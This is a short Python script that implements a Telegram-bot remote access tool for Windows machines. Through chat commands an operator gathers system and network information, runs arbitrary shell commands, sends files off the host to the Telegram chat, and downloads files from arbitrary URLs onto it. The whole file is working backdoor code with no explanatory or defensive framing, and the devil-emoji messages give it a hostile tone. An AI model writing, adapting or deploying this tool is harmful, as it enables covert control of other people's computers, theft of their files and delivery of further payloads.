import telebot
import subprocess
import os
import requests

# Replace 'YOUR_BOT_TOKEN' with your actual Telegram Bot token
bot = telebot.TeleBot('token')
# Replace 'YOUR_CHAT_ID' with the specific chat ID you want the bot to reply to
chat_id = 'chat_id'

@bot.message_handler(commands=['get_info'])
def get_info(message):
    try:
        info = subprocess.check_output(['systeminfo']).decode('utf-8')
        bot.send_message(chat_id, info)
    except Exception as e:
        bot.send_message(chat_id, f'Error: {str(e)}')

@bot.message_handler(commands=['ip_info'])
def ip_info(message):
    try:
        ip_info = subprocess.check_output(['ipconfig']).decode('utf-8')
        bot.send_message(chat_id, ip_info)
    except Exception as e:
        bot.send_message(chat_id, f'Error: {str(e)}')

@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        new_directory = message.text.split(' ', 1)[1]
        os.chdir(new_directory)
        bot.send_message(chat_id, f'😈Changed directory to {new_directory}')
    except Exception as e:
        bot.send_message(chat_id, f'Error: {str(e)}')

@bot.message_handler(commands=['list_dir'])
def list_directory(message):
    try:
        files = os.listdir()
        bot.send_message(chat_id, "✌️Current directory contents: " + ', '.join(files))
    except Exception as e:
        bot.send_message(chat_id, f'Error: {str(e)}')

@bot.message_handler(commands=['execute'])
def execute_command(message):
    try:
        command = message.text.split(' ', 1)[1]
        result = subprocess.check_output(['cmd', '/c', command], shell=True).decode('utf-8')
        bot.send_message(chat_id, result)
    except Exception as e:
        bot.send_message(chat_id, f'Error: {str(e)}')

@bot.message_handler(commands=['download'])
def download_file(message):
    file_path = message.text.split(' ', 1)[1]
    
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            bot.send_document(chat_id, file)
    else:
        bot.send_message(chat_id, f'🔴File not found: {file_path}')

@bot.message_handler(commands=['upload_file'])
def upload_file(message):
    if len(message.text.split(' ')) > 1:
        file_url = message.text.split(' ', 1)[1]
        filename = file_url.split('/')[-1]
        
        response = requests.get(file_url)
        if response.status_code == 200:
            with open(filename, 'wb') as file:
                file.write(response.content)
            bot.send_message(chat_id, f'✅File downloaded and saved as {filename}')
        else:
            bot.send_message(chat_id, f'🔴Failed to download file from {file_url}')
    else:
        bot.send_message(chat_id, '🛑Please provide a URL to download a file.')

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    # This command will stop the bot. You can add additional security checks if needed.
    if message.chat.id == chat_id:
        bot.send_message(chat_id, "😈Shutting down the bot.😈")
        bot.stop()

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
    Available commands:
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /get_info - Get machine information
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /ip_info - Get IP information
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /cd {directory} - Change working directory
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /list_dir - List directory contents
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /execute {command} - Execute a command
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /download {file_path} - Download a file
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /upload_file {URL} - Download a file from a URL and save it
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /shutdown - Shutdown the bot
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    /help - Display this help message
    🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
    """
    bot.send_message(chat_id, help_text)

bot.polling()
